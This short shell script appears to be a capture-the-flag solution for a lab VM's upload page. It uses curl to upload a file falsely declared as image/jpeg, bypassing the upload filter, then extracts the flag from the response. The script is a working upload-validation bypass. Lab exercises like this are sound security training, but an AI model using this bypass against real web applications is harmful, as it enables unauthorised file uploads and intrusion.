vm_ip=192.168.0.21 ## Replace vm_ip with your ip

touch inject.txt
curl -s --form "Upload=send" \
--header "Content-Type: multipart/form-data" \
--form "uploaded=@inject.txt;type=image/jpeg" \
http://$vm_ip/?page\=upload \
| grep flag \
| head -c 120 | tail -c 78
echo
rm inject.txt
